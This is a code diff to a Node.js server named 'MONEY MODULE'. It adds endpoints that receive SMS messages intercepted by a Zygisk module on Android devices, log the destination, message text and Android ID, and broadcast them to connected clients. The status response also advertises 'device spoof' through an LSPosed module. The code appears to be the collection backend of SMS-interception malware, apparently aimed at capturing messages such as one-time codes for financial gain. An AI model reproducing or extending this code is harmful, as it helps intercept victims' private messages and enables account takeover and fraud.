@@ -33,6 +33,12 @@ app.get('/', (req, res) => {
   res.json({
     status: 'online',
     message: 'MONEY MODULE Server Running',
+    version: '2.0',
+    features: ['Socket.IO', 'Zygisk HTTP', 'LSPosed Socket'],
+    endpoints: {
+      sms: '/sms (POST) - Zygisk module SMS interception',
+      send: '/send (POST) - LSPosed module device spoof'
+    },
     connectedDevices: connectedDevices.size,
     registeredDevices: registeredDevices.size,
     uptime: process.uptime()
@@ -40,6 +46,46 @@ app.get('/', (req, res) => {
 });
 
 app.use(express.json({ limit: '10mb' }));
+
+// SMS endpoint for Zygisk module (direct HTTP POST)
+app.post('/sms', (req, res) => {
+  try {
+    const { destination, message, androidId, timestamp } = req.body;
+    
+    console.log('========================================');
+    console.log('📱 SMS INTERCEPTED (Zygisk Module)');
+    console.log('  Destination:', destination);
+    console.log('  Message:', message);
+    console.log('  Android ID:', androidId);
+    console.log('  Timestamp:', timestamp);
+    console.log('========================================');
+    
+    // Store SMS data
+    const smsData = {
+      destination,
+      message,
+      androidId,
+      timestamp: timestamp || Date.now(),
+      receivedAt: new Date().toISOString(),
+      source: 'zygisk'
+    };
+    
+    // Emit to all connected Socket.IO clients
+    io.emit('sms', smsData);
+    
+    res.json({ 
+      success: true, 
+      message: 'SMS received and forwarded',
+      timestamp: Date.now()
+    });
+  } catch (error) {
+    console.error('[SMS] Error:', error);
+    res.status(500).json({
+      success: false,
+      message: 'Error processing SMS'
+    });
+  }
+});
 
 // SMS Send endpoint - App calls this for device spoof
 // NO Telegram forwarding here - app does it via handleSmsResult
